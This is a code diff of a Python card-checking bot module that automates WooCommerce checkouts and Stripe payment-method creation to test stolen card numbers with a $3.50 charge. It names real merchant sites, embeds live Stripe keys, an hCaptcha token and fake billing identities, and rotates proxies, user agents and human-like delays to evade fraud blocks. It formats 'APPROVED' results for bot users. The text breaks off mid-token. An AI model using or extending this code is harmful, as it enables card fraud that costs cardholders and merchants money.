@@ -33,7 +33,7 @@ try:
 except ImportError:
     charge_processor = None
 
-# Import proxy system - INTEGRATED FROM SHOPIFY.PY
+# Import proxy system
 try:
     from BOT.tools.proxy import (
         get_proxy_for_user,
@@ -58,15 +58,6 @@ except ImportError as e:
     
     def mark_proxy_failed(proxy: str):
         pass
-    
-    def get_random_proxy():
-        return None
-    
-    def parse_proxy(proxy_str: str):
-        return None
-    
-    def test_proxy(proxy_str: str):
-        return False
 
 # Custom logger with emoji formatting
 class EmojiLogger:
@@ -185,35 +176,33 @@ class StripeCharge3Checker:
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
         ]
         self.user_agent = random.choice(self.user_agents)
         self.bin_cache = {}
         self.last_bin_request = 0
-        self.base_url = "https://ippoipponurse.com"
+        self.base_url = "https://finaticspetcenter.com"
         
-        # Stripe keys from network data (stripe3.txt)
-        self.stripe_key = "pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs"
-        self.stripe_account = "acct_1O42NWCG8xnmzyo2"
+        # Stripe keys from network data
+        self.stripe_key = "pk_live_51Pb8AzJWvVkN4yp7zIV5r5aiv9cbGgr9urUElAjJknemdXaoGntmZuBWz63jobtRCrzp2KBUtEQ1ga69eIWu4INj00TDYcYDqa"
+        self.stripe_account = "acct_1Pb8AzJWvVkN4yp7"
         
         # Product info from network data
-        self.product_url = f"{self.base_url}/shop/"
-        self.product_id = "7693"  # Product ID from add_to_cart payload
-        self.variation_id = None
+        self.product_url = f"{self.base_url}/product/van-ness-pets-extra-small-open-cat-litter-box-kitten-rabbit-size-blue-cp0/"
+        self.product_id = "988869"
+        self.variation_id = "988870"
         
-        # US address data (from stripe3.txt - checkout payload)
+        # US address data (from network data)
         self.us_addresses = [
             {
                 "first_name": "Billy",
-                "last_name": "Mumiru",
+                "last_name": "Mandy",
                 "address": "8 log pond drive",
                 "city": "Hosham",
                 "postcode": "19044",
-                "phone": "",
                 "state": "PA",
-                "country": "US",
-                "email": "caseylang222@gmail.com"
+                "phone": "2048200578",
+                "email": "minipooch22@gmail.com"
             },
             {
                 "first_name": "John",
@@ -221,9 +210,8 @@ class StripeCharge3Checker:
                 "address": "123 Main Street",
                 "city": "New York",
                 "postcode": "10001",
-                "phone": "2125551234",
                 "state": "NY",
-                "country": "US",
+                "phone": "2125551234",
                 "email": "john.smith@gmail.com"
             },
             {
@@ -232,9 +220,8 @@ class StripeCharge3Checker:
                 "address": "456 Oak Avenue",
                 "city": "Los Angeles",
                 "postcode": "90001",
-                "phone": "3105555678",
                 "state": "CA",
-                "country": "US",
+                "phone": "3105555678",
                 "email": "sarah.johnson@gmail.com"
             }
         ]
@@ -250,12 +237,12 @@ class StripeCharge3Checker:
             r'pi_[a-zA-Z0-9]+_secret_',
         ]
 
-        # User agent for proxy
+        # User ID for proxy
         self.user_id = user_id
         
-        # Proxy management - INTEGRATED FROM SHOPIFY.PY
+        # Proxy management
         self.proxy_url = None
-        self.proxy_status = "Dead 🚫"  # Default status
+        self.proxy_status = "Dead 🚫"
         self.proxy_used = False
         self.proxy_response_time = 0.0
         
@@ -263,10 +250,7 @@ class StripeCharge3Checker:
         self.cookies = {}
         self.checkout_nonce = None
         self.update_order_review_nonce = None
-        self.woocommerce_cart_hash = None
-        self.wp_woocommerce_session = None
-        self.__stripe_mid = None
-        self.__stripe_sid = None
+        self.woosw_key = None
         
         # httpx client
         self.client = None
@@ -311,8 +295,7 @@ class StripeCharge3Checker:
             'FI': '🇫🇮', 'PL': '🇵🇱', 'TR': '🇹🇷', 'AE': '🇦🇪', 'SA': '🇸🇦',
             'SG': '🇸🇬', 'MY': '🇲🇾', 'TH': '🇹🇭', 'ID': '🇮🇩', 'PH': '🇵🇭',
             'VN': '🇻🇳', 'BD': '🇧🇩', 'PK': '🇵🇰', 'NG': '🇳🇬', 'ZA': '🇿🇦',
-            'BE': '🇧🇪', 'AT': '🇦🇹', 'PT': '🇵🇹', 'IE': '🇮🇪', 'NZ': '🇳🇿',
-            'EG': '🇪🇬', 'MA': '🇲🇦'
+            'BE': '🇧🇪', 'AT': '🇦🇹', 'PT': '🇵🇹', 'IE': '🇮🇪', 'NZ': '🇳🇿'
         }
         return country_emojis.get(country_code.upper() if country_code else 'N/A', '🏳️')
 
@@ -450,8 +433,6 @@ class StripeCharge3Checker:
         if match2:
             error_text = match2.group(1).strip()
             error_text = re.sub(r'<[^>]+>', '', error_text).strip()
-            if "there was an error processing the payment:" in error_text.lower():
-                error_text = error_text.split(":", 1)[-1].strip()
             error_text = self.trim_error_message(error_text)
             return error_text
         
@@ -496,35 +477,148 @@ class StripeCharge3Checker:
             nonces['update_order_review_nonce'] = security_match.group(1)
             logger.success(f"Extracted update_order_review nonce: {nonces['update_order_review_nonce']}")
         
-        # Alternative pattern for security nonce
-        if 'update_order_review_nonce' not in nonces:
-            alt_match = re.search(
-                r'"update_order_review_nonce":"([a-f0-9]{10})"',
-                html_content
-            )
-            if alt_match:
-                nonces['update_order_review_nonce'] = alt_match.group(1)
-                logger.success(f"Extracted update_order_review nonce (alt): {nonces['update_order_review_nonce']}")
-        
         return nonces
 
+    async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info=None):
+        """Format response matching scharge012.py style with trimmed message"""
+        if bin_info is None:
+            bin_info = await self.get_bin_info(cc)
+        
+        safe_bin_info = {
+            'scheme': str(bin_info.get('scheme', 'N/A')),
+            'type': str(bin_info.get('type', 'N/A')),
+            'brand': str(bin_info.get('brand', 'N/A')),
+            'bank': str(bin_info.get('bank', 'N/A')) if bin_info.get('bank') else 'N/A',
+            'country': str(bin_info.get('country', 'N/A')),
+            'country_code': str(bin_info.get('country_code', 'N/A')),
+            'emoji': str(bin_info.get('emoji', '🏳️'))
+        }
+
+        user_id = user_data.get("user_id", "Unknown")
+        first_name = html.escape(str(user_data.get("first_name", "User")))
+        badge = user_data.get("plan", {}).get("badge", "🧿")
+
+        # Trim the message for display
+        trimmed_message = self.trim_error_message(str(message)) if message else ""
+
+        if any(pattern in trimmed_message.lower() for pattern in ["3d secure", "authentication required", "3ds", "requires_confirmation", "requires_action"]):
+            status_emoji = "❌"
+            status_text = "DECLINED"
+            message_display = "3D SECURE❎"
+        elif status == "APPROVED":
+            status_emoji = "✅"
+            status_text = "APPROVED"
+            message_display = "Successfully Charged $3.50"
+        else:
+            status_emoji = "❌"
+            status_text = "DECLINED"
+            message_display = trimmed_message if trimmed_message else "Payment declined"
+
+        clean_name = re.sub(r'[↯⌁«~∞🍁]', '', first_name).strip()
+        user_display = f"「{badge}」{clean_name}"
+        
+        bank_info = safe_bin_info['bank'].upper() if safe_bin_info['bank'] != 'N/A' else 'N/A'
+
+        response = f"""<b>「$cmd → /xs」| <b>WAYNE</b> </b>
+━━━━━━━━━━━━━━━
+<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
+<b>[•] Gateway -</b> Stripe Charge $3.50
+<b>[•] Status-</b> <code>{status_text} {status_emoji}</code>
+<b>[•] Response-</b> <code>{message_display}</code>
+━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
+<b>[+] Bin:</b> <code>{cc[:6]}</code>  
+<b>[+] Info:</b> <code>{safe_bin_info['scheme']} - {safe_bin_info['type']} - {safe_bin_info['brand']}</code>
+<b>[+] Bank:</b> <code>{bank_info}</code> 🏦
+<b>[+] Country:</b> <code>{safe_bin_info['country']}</code> [{safe_bin_info['emoji']}]
+━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
+<b>[ﾒ] Checked By:</b> {user_display}
+<b>[ϟ] Dev ➺</b> <b><i>DADYY</i></b>
+━━━━━━━━━━━━━━━
+<b>[ﾒ] T/t:</b> <code>{elapsed_time:.2f} 𝐬</code> |<b>P/x:</b> <code>{self.proxy_status}</code></b>"""
+
+        return response
+
+    def get_processing_message(self, cc, mes, ano, cvv, username, user_plan):
+        """Get processing message matching scharge012.py style"""
+        return f"""<b>「$cmd → /xs」| <b>WAYNE</b> </b>
+━━━━━━━━━━━━━━━
+<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
+<b>[•] Gateway -</b> Stripe Charge $3.50
+<b>[•] Status-</b> Processing... ⏳
+━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
+<b>[+] Plan:</b> {user_plan}
+<b>[+] User:</b> @{username}
+━━━━━━━━━━━━━━━
+<b>Checking card... Please wait.</b>"""
+
+    async def human_delay(self, min_delay=0.5, max_delay=1.5):
+        """Simulate human delay between actions"""
+        delay = random.uniform(min_delay, max_delay)
+        await asyncio.sleep(delay)
+
+    async def make_request_with_retry(self, method, url, max_retries=3, **kwargs):
+        """Make request with retry logic for VPS compatibility"""
+        last_exception = None
+        
+        for attempt in range(max_retries):
+            try:
+                if attempt > 0:
+                    logger.warning(f"Retry attempt {attempt}/{max_retries} for {url}")
+                    await asyncio.sleep(1.5 * attempt)
+                
+                headers = kwargs.get('headers', {}).copy()
+                
+                # Merge with base headers
+                base_headers = self.get_base_headers()
+                for key, value in base_headers.items():
+                    if key not in headers:
+                        headers[key] = value
+                
+                # Update dynamic headers
+                headers['User-Agent'] = self.user_agent
+                headers['Accept-Language'] = self.accept_language
+                
+                kwargs['headers'] = headers
+
+                response = await self.client.request(method, url, **kwargs)
+                
+                # Store cookies from response
+                if response.cookies:
+                    for name, value in response.cookies.items():
+                        self.cookies[name] = value
+                
+                return response
+                
+            except (httpx.ConnectError, httpx.NetworkError, httpx.ProtocolError) as e:
+                last_exception = e
+                logger.warning(f"Connection error on attempt {attempt + 1}: {str(e)}")
+                if attempt < max_retries - 1:
+                    continue
+                else:
+                    raise last_exception
+            except httpx.TimeoutException as e:
+                last_exception = e
+                logger.warning(f"Timeout on attempt {attempt + 1}")
+                if attempt < max_retries - 1:
+                    continue
+                else:
+                    raise last_exception
+        
+        raise last_exception if last_exception else Exception("All retry attempts failed")
+
     async def initialize_session(self):
-        """Initialize session with proper cookies and proxy"""
+        """Initialize session with proper cookies"""
         try:
             logger.step(1, 7, "Initializing session...")
 
             response = await self.make_request_with_retry('GET', f"{self.base_url}/")
 
             if response.status_code == 200:
-                # Extract cookies
-                if 'woocommerce_cart_hash' in response.cookies:
-                    self.woocommerce_cart_hash = response.cookies['woocommerce_cart_hash']
-                if 'wp_woocommerce_session' in response.cookies:
-                    self.wp_woocommerce_session = response.cookies['wp_woocommerce_session']
-                if '__stripe_mid' in response.cookies:
-                    self.__stripe_mid = response.cookies['__stripe_mid']
-                if '__stripe_sid' in response.cookies:
-                    self.__stripe_sid = response.cookies['__stripe_sid']
+                # Store woosw_key from cookies
+                for cookie_name, cookie_value in self.cookies.items():
+                    if 'woosw_key' in cookie_name.lower():
+                        self.woosw_key = cookie_value
+                        logger.success(f"Found woosw_key: {self.woosw_key}")
                 
                 logger.success("Session initialized successfully")
                 return True
@@ -536,61 +630,94 @@ class StripeCharge3Checker:
             logger.error(f"Session initialization error: {str(e)}")
             return False
 
-    async def add_product_to_cart(self):
-        """Add product to cart using AJAX add_to_cart endpoint"""
+    async def get_woosw_button(self):
+        """Get wishlist button data"""
         try:
-            logger.step(2, 7, "Adding product to cart...")
-
-            # Visit shop page first
-            await self.make_request_with_retry('GET', f"{self.base_url}/shop/")
-
-            # Add to cart using wc-ajax endpoint
-            add_to_cart_data = {
-                'wc-ajax': 'add_to_cart',
-                'product_sku': '',
-                'product_id': self.product_id,
-                'quantity': '1'
+            logger.step(2, 7, "Getting wishlist data...")
+            
+            payload = {
+                'action': 'vamtam_get_woosw_button',
+                'id': self.product_id
             }
-
-            add_headers = {
-                "Accept": "application/json, text/javascript, */*; q=0.01",
-                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "X-Requested-With": "XMLHttpRequest",
+            
+            headers = {
+                "Accept": "*/*",
+                "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
                 "Origin": self.base_url,
-                "Referer": f"{self.base_url}/shop/",
+                "Referer": self.product_url,
+                "X-Requested-With": "XMLHttpRequest"
             }
-
-            response = await self.make_request_with_retry('POST', f"{self.base_url}/?wc-ajax=add_to_cart", headers=add_headers, data=add_to_cart_data)
-
+            
+            response = await self.make_request_with_retry('POST', f"{self.base_url}/wp-admin/admin-ajax.php", headers=headers, data=payload)
+            
             if response.status_code == 200:
-                try:
-                    result = response.json()
-                    if result.get('added'):
-                        logger.success("Product added to cart successfully")
-                        
-                        # Update cart hash from response cookies
-                        if 'woocommerce_cart_hash' in response.cookies:
-                            self.woocommerce_cart_hash = response.cookies['woocommerce_cart_hash']
-                            logger.success(f"Cart hash updated: {self.woocommerce_cart_hash}")
-                        
-                        return True, None
-                    else:
-                        return False, "Failed to add to cart"
-                except:
-                    return False, "Invalid response from add_to_cart"
+                logger.success("Wishlist data retrieved")
+                return True
             else:
-                return False, f"Add to cart failed: {response.status_code}"
-
+                logger.warning(f"Wishlist request failed: {response.status_code}")
+                return False
+                
         except Exception as e:
-            logger.error(f"Add to cart error: {str(e)}")
-            return False, f"Add to cart error: {str(e)}"
+            logger.error(f"Wishlist error: {str(e)}")
+            return False
+
+    async def select_variation(self):
+        """Select product variation (small size)"""
+        try:
+            logger.step(3, 7, "Selecting product variation...")
+            
+            # First, ensure we're on the product page
+            response = await self.make_request_with_retry('GET', self.product_url)
+            
+            if response.status_code not in [200, 202]:
+                return False, f"Failed to load product page: {response.status_code}"
+            
+            # Get woosw button first
+            await self.get_woosw_button()
+            
+            # Select small size via AJAX
+            payload = {
+                'action': 'vamtam_get_woosw_button',
+                'id': self.product_id
+            }
+            
+            # Add variation selection
+            variation_payload = {
+                'product_id': self.product_id,
+                'is_variable': 'true',
+                'attribute_pa_size': 'small',
+                'quantity': '1',
+                'variation_id': self.variation_id,
+                'product_sku': '',
+                'action': 'woocommerce_ajax_add_to_cart'
+            }
+            
+            headers = {
+                "Accept": "*/*",
+                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "Origin": self.base_url,
+                "Referer": self.product_url,
+                "X-Requested-With": "XMLHttpRequest"
+            }
+            
+            response = await self.make_request_with_retry('POST', f"{self.base_url}/wp-admin/admin-ajax.php", headers=headers, data=variation_payload)
+            
+            if response.status_code == 200:
+                logger.success("Product variation selected and added to cart")
+                return True, None
+            else:
+                return False, f"Failed to add to cart: {response.status_code}"
+                
+        except Exception as e:
+            logger.error(f"Variation selection error: {str(e)}")
+            return False, f"Variation selection error: {str(e)}"
 
     async def get_checkout_page(self):
         """Load checkout page and extract nonces"""
         try:
-            logger.step(3, 7, "Loading checkout page...")
+            logger.step(4, 7, "Loading checkout page...")
 
-            response = await self.make_request_with_retry('GET', f"{self.base_url}/checkout-2/")
+            response = await self.make_request_with_retry('GET', f"{self.base_url}/checkout/")
 
             if response.status_code != 200:
                 return False, f"Failed to load checkout page: {response.status_code}"
@@ -616,85 +743,76 @@ class StripeCharge3Checker:
     async def update_order_review(self, user_info):
         """Update order review with US address"""
         try:
-            logger.step(4, 7, "Updating order review...")
+            logger.step(5, 7, "Updating order review...")
             
             if not self.update_order_review_nonce:
                 logger.warning("Missing update_order_review_nonce, attempting to get from checkout page")
                 success, error = await self.get_checkout_page()
                 if not success:
                     return False, f"Failed to get checkout page: {error}"
-                
-                if not self.update_order_review_nonce:
-                    return False, "Could not extract update_order_review_nonce from checkout page"
 
-            # Build post_data exactly as in network data (stripe3.txt)
+            # Build post_data as in network data
             current_time = datetime.now()
             session_start = current_time.strftime('%Y-%m-%d %H:%M:%S')
             
             # URL encode the user agent
             user_agent_encoded = self.user_agent.replace(' ', '%20')
             
-            # Build post_data string matching the format from stripe3.txt
-            post_data_str = (
-                f"wc_order_attribution_source_type=typein&"
-                f"wc_order_attribution_referrer=%28none%29&"
-                f"wc_order_attribution_utm_campaign=%28none%29&"
-                f"wc_order_attribution_utm_source=%28direct%29&"
-                f"wc_order_attribution_utm_medium=%28none%29&"
-                f"wc_order_attribution_utm_content=%28none%29&"
-                f"wc_order_attribution_utm_id=%28none%29&"
-                f"wc_order_attribution_utm_term=%28none%29&"
-                f"wc_order_attribution_utm_source_platform=%28none%29&"
-                f"wc_order_attribution_utm_creative_format=%28none%29&"
-                f"wc_order_attribution_utm_marketing_tactic=%28none%29&"
-                f"wc_order_attribution_session_entry=https%3A%2F%2Fippoipponurse.com%2F&"
-                f"wc_order_attribution_session_start_time={session_start.replace(' ', '%20')}&"
-                f"wc_order_attribution_session_pages=11&"
-                f"wc_order_attribution_session_count=1&"
-                f"wc_order_attribution_user_agent={user_agent_encoded}&"
-                f"billing_first_name={user_info['first_name']}&"
-                f"billing_last_name={user_info['last_name']}&"
-                f"billing_company=&"
-                f"billing_country={user_info['country']}&"
-                f"billing_address_1={user_info['address'].replace(' ', '%20')}&"
-                f"billing_address_2=&"
-                f"billing_city={user_info['city']}&"
-                f"billing_state={user_info['state']}&"
-                f"billing_postcode={user_info['postcode']}&"
-                f"billing_phone={user_info['phone'].replace(' ', '%20') if user_info['phone'] else ''}&"
-                f"billing_email={user_info['email'].replace('@', '%40')}&"
-                f"shipping_first_name=&"
-                f"shipping_last_name=&"
-                f"shipping_company=&"
-                f"shipping_country={user_info['country']}&"
-                f"shipping_address_1=&"
-                f"shipping_address_2=&"
-                f"shipping_postcode=&"
-                f"shipping_city=&"
-                f"shipping_state=&"
-                f"order_comments=&"
-                f"payment_method=woocommerce_payments&"
-                f"woocommerce-process-checkout-nonce={self.checkout_nonce or ''}&"
-                f"_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review"
-            )
-
             post_data = {
                 'wc-ajax': 'update_order_review',
                 'security': self.update_order_review_nonce,
-                'country': user_info['country'],
+                'payment_method': 'stripe_cc',
+                'country': 'US',
                 'state': user_info['state'],
                 'postcode': user_info['postcode'],
                 'city': user_info['city'],
                 'address': user_info['address'],
                 'address_2': '',
-                's_country': user_info['country'],
+                's_country': 'US',
                 's_state': user_info['state'],
                 's_postcode': user_info['postcode'],
                 's_city': user_info['city'],
                 's_address': user_info['address'],
                 's_address_2': '',
                 'has_full_address': 'true',
-                'post_data': post_data_str
+                'post_data': (
+                    f"wc_order_attribution_source_type=typein&"
+                    f"wc_order_attribution_referrer=(none)&"
+                    f"wc_order_attribution_utm_campaign=(none)&"
+                    f"wc_order_attribution_utm_source=(direct)&"
+                    f"wc_order_attribution_utm_medium=(none)&"
+                    f"wc_order_attribution_utm_content=(none)&"
+                    f"wc_order_attribution_utm_id=(none)&"
+                    f"wc_order_attribution_utm_term=(none)&"
+                    f"wc_order_attribution_utm_source_platform=(none)&"
+                    f"wc_order_attribution_utm_creative_format=(none)&"
+                    f"wc_order_attribution_utm_marketing_tactic=(none)&"
+                    f"wc_order_attribution_session_entry=https%3A%2F%2Ffinaticspetcenter.com%2Fmy-account%2F&"
+                    f"wc_order_attribution_session_start_time={session_start.replace(' ', '%20')}&"
+                    f"wc_order_attribution_session_pages=11&"
+                    f"wc_order_attribution_session_count=1&"
+                    f"wc_order_attribution_user_agent={user_agent_encoded}&"
+                    f"billing_first_name={user_info['first_name']}&"
+                    f"billing_last_name={user_info['last_name']}&"
+                    f"billing_company=&"
+                    f"billing_country=US&"
+                    f"billing_address_1={user_info['address'].replace(' ', '%20')}&"
+                    f"billing_address_2=&"
+                    f"billing_city={user_info['city']}&"
+                    f"billing_state={user_info['state']}&"
+                    f"billing_postcode={user_info['postcode']}&"
+                    f"billing_phone={user_info['phone']}&"
+                    f"billing_email={user_info['email'].replace('@', '%40')}&"
+                    f"order_comments=&"
+                    f"coupon_code=&"
+                    f"payment_method=stripe_cc&"
+                    f"stripe_cc_token_key=&"
+                    f"stripe_cc_payment_intent_key=&"
+                    f"terms=on&"
+                    f"terms-field=1&"
+                    f"woocommerce-process-checkout-nonce={self.checkout_nonce or ''}&"
+                    f"_wp_http_referer=https%3A%2F%2Ffinaticspetcenter.com%2Fcheckout%2F"
+                )
             }
 
             update_headers = {
@@ -702,37 +820,19 @@ class StripeCharge3Checker:
                 "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                 "X-Requested-With": "XMLHttpRequest",
                 "Origin": self.base_url,
-                "Referer": f"{self.base_url}/checkout-2/",
+                "Referer": f"{self.base_url}/checkout/",
             }
 
             logger.network(f"Sending update_order_review with security nonce: {self.update_order_review_nonce}")
 
             response = await self.make_request_with_retry('POST', f"{self.base_url}/?wc-ajax=update_order_review", headers=update_headers, data=post_data)
 
-            logger.network(f"Update order review response status: {response.status_code}")
-
             if response.status_code == 200:
-                try:
-                    result = response.json()
-                    logger.success("Order review updated successfully")
-                    return True, result
-                except:
-                    logger.success("Order review updated (non-JSON response)")
-                    return True, None
+                logger.success("Order review updated successfully")
+                return True, None
             elif response.status_code == 403:
-                logger.error(f"403 Forbidden - Possible Cloudflare block or missing nonce")
-                logger.warning("Retrying with fresh checkout page...")
-                await asyncio.sleep(2)
-                
-                success, error = await self.get_checkout_page()
-                if success and self.update_order_review_nonce:
-                    post_data['security'] = self.update_order_review_nonce
-                    response = await self.make_request_with_retry('POST', f"{self.base_url}/?wc-ajax=update_order_review", headers=update_headers, data=post_data)
-                    
-                    if response.status_code == 200:
-                        return True, None
-                
-                return False, f"403 Forbidden - Site may be blocking automated requests"
+                logger.error("403 Forbidden - Possible security block")
+                return False, "403 Forbidden - Site may be blocking automated requests"
             else:
                 return False, f"Update order review failed: {response.status_code}"
 
@@ -745,53 +845,52 @@ class StripeCharge3Checker:
         try:
             cc, mes, ano, cvv = card_details
 
-            logger.step(5, 7, "Creating payment method...")
+            logger.step(6, 7, "Creating payment method...")
 
-            # Get stripe IDs from cookies or generate
-            muid = self.__stripe_mid if self.__stripe_mid else f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
-            sid = self.__stripe_sid if self.__stripe_sid else f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
+            # Generate GUIDs (from network data format)
+            guid = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
             
-            # Generate client session ID
-            client_session_id = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
-            
-            # Format year (ensure 2-digit for expiry)
-            exp_year = ano[-2:] if len(ano) == 4 else ano
+            # Get stripe mid/sid from cookies or generate
+            muid = self.cookies.get('__stripe_mid', f"{random.randint(10000000, 99999999)}-7278-41eb-b2bc-{random.randint(100000000000, 999999999999)}")
+            sid = self.cookies.get('__stripe_sid', f"{random.randint(10000000, 99999999)}-eedd-4efc-8379-{random.randint(100000000000, 999999999999)}")
 
             payment_data = {
                 'billing_details[name]': f"{user_info['first_name']} {user_info['last_name']}",
-                'billing_details[email]': user_info['email'],
                 'billing_details[phone]': user_info['phone'],
+                'billing_details[email]': user_info['email'],
                 'billing_details[address][city]': user_info['city'],
-                'billing_details[address][country]': user_info['country'],
+                'billing_details[address][country]': 'US',
                 'billing_details[address][line1]': user_info['address'],
-                'billing_details[address][line2]': '',
                 'billing_details[address][postal_code]': user_info['postcode'],
                 'billing_details[address][state]': user_info['state'],
                 'type': 'card',
                 'card[number]': cc,
                 'card[cvc]': cvv,
-                'card[exp_year]': exp_year,
-                'card[exp_month]': mes,
+                'card[exp_year]': ano[-2:] if len(ano) == 4 else ano,
+                'card[exp_month]': mes.zfill(2),
                 'allow_redisplay': 'unspecified',
                 'pasted_fields': 'number',
                 'payment_user_agent': 'stripe.js/e4b3a3b372; stripe-js-v3/e4b3a3b372; payment-element; deferred-intent',
                 'referrer': self.base_url,
-                'time_on_page': str(random.randint(60000, 80000)),
-                'client_attribution_metadata[client_session_id]': client_session_id,
+                'time_on_page': str(random.randint(200000, 250000)),
+                'client_attribution_metadata[client_session_id]': f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}",
                 'client_attribution_metadata[merchant_integration_source]': 'elements',
                 'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                 'client_attribution_metadata[merchant_integration_version]': '2021',
                 'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                 'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                 'client_attribution_metadata[elements_session_config_id]': f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}",
-                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
-                'guid': f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}",
+                'guid': guid,
                 'muid': muid,
                 'sid': sid,
                 'key': self.stripe_key,
                 '_stripe_account': self.stripe_account,
-                'radar_options[hcaptcha_token]': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzcyMzg5OTgwLCJjZGF0YSI6IlhmRVFXZnJlMjhGMzhrOHFnc05qaUpTV2paOVp6cEZ3RU80b0FobWwxT204RWRoSkhHMEdNWit3UG1mL2VnN08rRk53YTB4QWlOdUd2TjF0RU5haDJHNzltK05XcGx2bFc0aWZqVTA0ZFpNRHpUenBDRHprQnBQT3FYcGN3WHZMdno2QTU2aHBBajNQUVhOZGM0MWFzRGtMWThDT0FLb3c3UmVxRnpZVTg0VndFWGgvRWFUVlV1VXoxRG1zMEh4NGFqallMRHFROW9XV1NOandPUDJzZDhYZHZsZlNsbzhCdmRLMFhqMWNOb0pjaWpaVmVZMUgvNVYyOW1WNHQ1dWVPQkZnWXFyNHVzUDQyaUdxNitucUE4UVh5dEMzZGxQUXl6RFErRHBiTHdRUVBsZXFkcloreWNndmd3TnJYc1QyUWl4RHhXRks4b3FlREx6M043VUFxWk4xZ29NNWtrc0VnKzUxVXJzdDdGdz1MVDZmaUVaUmw4a0JZUWNWIiwicGFzc2tleSI6ImNuOUZpcEFOdzhDTjVJT0U0UWRwMGVzL1hzc05mSmdxTWtJUFZBaWNMbk1ZQ09ld3p1bEt4Z3h4MU41MGsrcVJEYVAzV3FlQS9qN0lVOUVvZmdIUUNFKzZ1UmVJKzZyS1k3bHU3ckxqMC9vR05GM1FoZjVsM053aDlOWHNEeFJuNVIwdlVTRzNqZDZVZjlEcGh6ekV6QjJBNTBQV0JTUFVaN24zVWJGRWE5Q1Z5SFVmUDVNSjg5VWpwUGV0R0gxanVMQkpCY3NDM21KSHMvTUZqMlZUdmNZQ3h1cjRiK2RTZ2h1YmVjdkh5NFZIOWRVNDhmQzhHOG1rNDBGRHNVY1JINTM0dDduNkJQbEl3UmxnODBSWGdUY2o2TG8zcVpvS2Z0OGFxT2w3cXJzSVZGR29SZUQ3dmhsa0k3RmRSVVlQL2xsSUh0NHczN1J0MVlHMHdRRHh5UHZjZm9UMjdhNUZudThIK1FPOVRWa3BXZVJUeTNyRE5mQ2FrV3oxVEZ4bXgwczNUREg2RTA3MGtrNTJlSnAwU0Z1SWNMYWJNVWdUZ0g3YU44cHVNVG1weGRnWXBmU215ekZDbmo0WjI1Szh3MjFZc3M1Q0JDWnlqY0JtNjNkRE0wajlBVi92VXRTZUhHZGdlS0ZzbW41alZwS3FYazdpdFVoUkRuV2s4R0ZhbGI5LzZ6M294dUhkcUg0QnY0Tkkya1V6NUhRSjJ4MEQya3FWK1VCQis5U05QRlpiNk9BQVpZU2NnUER5MTNGekxITjFDNlBGT2hyWFp1NC8xejJuNTdxV2RWaHd5N2lHRDNsN1k0ZE5hRzBMaTZXTElhRlE1aVZodG9xbE9WSHdUdjdoR0pXWEovOThIbWlKRnp1VFBZeGgrc2QwMkZxelppbmRINjFXdW0zNk50Ykk4QW8vVmx5ZWI0QmZIS3g4NTlUNzBmR0w3alhSRDdPTDR0VjZLTkxPQm1OUE0yY3g2OVN5TzNSTExzalM3SVhJSnZFT2QyV0o5SDVNaDVXeVBqWGNNcyt3bXB3V1ByWkxCZmFOeCtVTyttZ0RVbWhWOWxXTGI4RGFlc2xKSnlMeUhTanhPV2JLbXM4RTJDVlNSZzgrdlFEekNhaFRxRllDYjhtK3ZRUVAvVitKQnRxR01tSXgyRlNBN3R1Vy9ycFVaamNpdjFZdVorTnMxbXFyZnRodHE1MlV2b1NKcHFaZ0JXL3BTbUZYTHFTOUh5VytLRTY1SG1BaTExcEFNZTI4cWk2SEpycThhY2JxbHhNdGVJcmNDRm1mSmVzT0V4Q2ZsL0t6bGlSVXdmbEVnWGVNbUNJY3poN0JkN01zWTdUTmNFTzZyS2JXWkEyc3QrSnFSRmY0WGQwSUdPMjZieElFOXVYQzRHOS9qUWxzMURHbEc1RjJrK2hVaGhVVlNHbEVaUUV3N2tGRnNmN